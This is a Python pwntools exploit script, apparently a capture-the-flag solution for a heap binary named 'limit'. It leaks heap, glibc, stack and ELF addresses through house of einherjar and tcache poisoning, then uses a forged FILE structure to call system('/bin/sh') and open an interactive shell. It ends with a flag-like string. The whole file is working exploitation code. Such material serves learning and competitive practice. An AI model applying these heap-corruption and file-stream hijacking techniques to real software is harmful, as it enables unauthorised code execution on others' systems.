from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./limit_patched', '''
    b *(main+324)
    b *(main+673)
    b *(main+886)
    b *(main+1071)
    continue
''')

# p = remote('smiley.cat', 36505)

def malloc(index, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())

def free(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(index).encode())

def read(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.recvuntil(b"Data: ")
    return p.recvuntil(b"\n\n", drop=True)

def write(index, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendafter(b"Data: ", data)

glibc_e = ELF('./libc.so.6')


# Stage 1: Leak heap base address and glibc base address
for i in range(8):
    malloc(i, 0xf8)
malloc(8, 0x18)
for i in range(8):
    free(i)
for i in range(7):
    malloc(i, 0xf8)
heap_base_addr = ((u64(read(6).ljust(8, b'\x00'))<<12)^0)&~0xfff
log.info(f"heap base address: {hex(heap_base_addr)}")
malloc(7, 0x18)
glibc_base_addr = (u64(read(7).ljust(8, b'\x00'))&~0xfff)-0x203000
log.info(f"glibc base address: {hex(glibc_base_addr)}")
malloc(8, 0xd8)

# Stage 2: Leak stack argv address (house of einherjar)
malloc(0, 0x28)
malloc(1, 0x28)
malloc(2, 0x28)
malloc(3, 0x28)
malloc(4, 0xf8)
write(0, p64(0)+p64(0xb0)+p64(heap_base_addr + 0xac0)*2)
write(3, p64(0)*4+p64(0xb0))
for i in range(5, 12):
    malloc(i, 0xf8)
for i in range(5, 12):
    free(i)
free(4)
free(2)
free(1)
malloc(12, 0xa8)
write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0xaf0)>>12)^(glibc_base_addr+glibc_e.symbols['__libc_argv'])))
malloc(13, 0x28)
malloc(14, 0x28)
free(3)
malloc(15, 0x28)
stack_argv_addr = u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0xb50)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
log.info(f'stack argv address: {hex(stack_argv_addr)}')
for i in range(8):
    malloc(i, 0xf8)

# Stage 3: Leak elf start address (house of einherjar)
malloc(0, 0x28)
malloc(1, 0x28)
malloc(2, 0x28)
malloc(3, 0x28)
malloc(4, 0xf8)
write(0, p64(0)+p64(0xb0)+p64(heap_base_addr + 0x1380)*2)
write(3, p64(0)*4+p64(0xb0))
for i in range(5, 12):
    malloc(i, 0xf8)
for i in range(5, 12):
    free(i)
free(4)
free(2)
free(1)
malloc(12, 0xa8)
write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0x13b0)>>12)^(stack_argv_addr-0x48)))
malloc(13, 0x28)
malloc(14, 0x28)
free(3)
malloc(15, 0x28)
elf_start_addr = u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0x1410)>>12)^((stack_argv_addr-0x48)>>12)
log.info(f'elf start address: {hex(elf_start_addr)}')
for i in range(8):
    malloc(i, 0xf8)

# Stage 4: Modify global variable in bss section (house of einherjar and tcache poisoning)
malloc(0, 0x28)
malloc(1, 0xe8)
malloc(2, 0xe8)
malloc(3, 0xf8)
write(0, p64(0)+p64(0x200)+p64(heap_base_addr+0x1c40)*2)
write(2, p64(0)*0x1c+p64(0x200))
free(2)
free(1)
for i in range(4, 11):
    malloc(i, 0xf8)
for i in range(4, 11):
    free(i)
free(3)
malloc(11, 0x38)
write(11, p64(0)*3+p64(0xf1)+p64(((heap_base_addr+0x1c70)>>12)^(elf_start_addr+0x2f50)))
malloc(12, 0xe8)
malloc(13, 0xe8)
write(13, p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])+p64(0)*4+p64(0x00ff00000000))

# Stage 5: Pop a shell (FSOP)
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym['system']
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._lock = glibc_base_addr+glibc_e.sym['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x200
fake.unknown2=p64(0)*2+p64(glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.sym['_IO_wfile_jumps']-0x18)
write(14, bytes(fake))

p.interactive()

# .;,;.{1_am_4_f1ag_gr3nad3_I_am_a_f14g_gren4d3_I_4m_4_fl4g_gr3nade_aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9wL0RJZUg3alRwaXdNLw==}